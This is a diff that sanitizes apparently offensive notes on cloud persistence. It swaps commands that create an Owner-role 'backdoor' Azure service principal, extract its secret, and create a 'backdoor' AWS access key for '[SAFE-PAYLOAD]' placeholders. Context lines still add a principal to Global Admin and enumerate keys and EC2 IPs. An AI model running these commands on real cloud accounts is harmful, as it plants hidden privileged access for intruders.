@@ -180,9 +180,9 @@ Establish persistence in Azure:
 
 ```powershell
 # Create backdoor service principal
-$spn = New-AzAdServicePrincipal -DisplayName "WebService" -Role Owner
-$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($spn.Secret)
-$UnsecureSecret = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
+# [SAFE-PAYLOAD] Simulate creation of backdoor service principal
+# [SAFE-PAYLOAD] Simulate Secret extraction
+# [SAFE-PAYLOAD] Simulate Secret storage
 
 # Add service principal to Global Admin
 $sp = Get-MsolServicePrincipal -AppPrincipalId <AppID>
@@ -278,7 +278,7 @@ Establish persistence in AWS:
 aws iam list-access-keys --user-name <username>
 
 # Create backdoor access key
-aws iam create-access-key --user-name <username>
+# [SAFE-PAYLOAD] aws iam create-access-key --user-name <username> (Simulated)
 
 # Get all EC2 public IPs
 for region in $(cat regions.txt); do
